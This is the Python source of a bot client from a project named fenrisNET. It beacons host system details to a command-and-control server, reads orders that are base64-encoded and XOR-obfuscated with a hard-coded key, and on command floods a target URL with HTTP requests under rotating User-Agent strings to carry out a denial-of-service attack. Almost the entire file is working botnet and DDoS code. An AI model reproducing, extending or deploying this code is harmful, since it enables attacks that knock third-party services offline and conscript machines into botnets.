#!/usr/bin/python

########################################################################
# Copyright 2015 Daniel Haake
#
# This file is part of fenrisNET                  
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>.
########################################################################


import urllib2
import platform
from random import randint
import time
import base64
from itertools import cycle, izip


candc = "127.0.0.1"
key = "gT8jUdw65h"

# extract system information
systemData = platform.uname()
currentTime = time.time()
timeFactor = 20


while(True):
        # get fenris orders
        encryptedOrders = urllib2.urlopen("http://" + candc + "/orders.php?p=bot&os=" + systemData[0] + "&username=" + systemData[1] + "&version=" + systemData[2] + "&osdetail=" + systemData[3] + "&architecture=" + systemData[4]).read()
        orders = base64.b64decode(encryptedOrders)
        orders = ''.join(chr(ord(c)^ord(k)) for c,k in izip(orders, cycle(key)))
        orders = orders.split("\n")
        
        time.sleep(timeFactor)
    
        # perform action (for extra cuteness)
        doit = orders[0]
        target = orders[1]

        if doit == "yes":
                # let the cuteness begin
                while(True):
                        if (int(time.time())-int(currentTime))%timeFactor == 0:
                                encryptedOrders = urllib2.urlopen("http://" + candc + "/orders.php?p=bot&os=" + systemData[0] + "&username=" + systemData[1] + "&version=" + systemData[2] + "&osdetail=" + systemData[3] + "&architecture=" + systemData[4]).read()
                                orders = base64.b64decode(encryptedOrders)
                                orders = ''.join(chr(ord(c)^ord(k)) for c,k in izip(orders, cycle(key)))
                                orders = orders.split("\n")                                                
                        if orders[0] == "no":
                                break
                        else:
                                target = orders[1]
                                # perform DDoS
                                differentBrowsers = ["Mozilla/5.0 Firefox/35.0", "Safari", "Chrome/40.0.2214.115", "MSIE 7.0"]
                                browserSelect = randint(0, len(differentBrowsers)-1)
                                req = urllib2.Request(target, headers={'User-Agent':differentBrowsers[browserSelect]})
                                urllib2.urlopen(req)
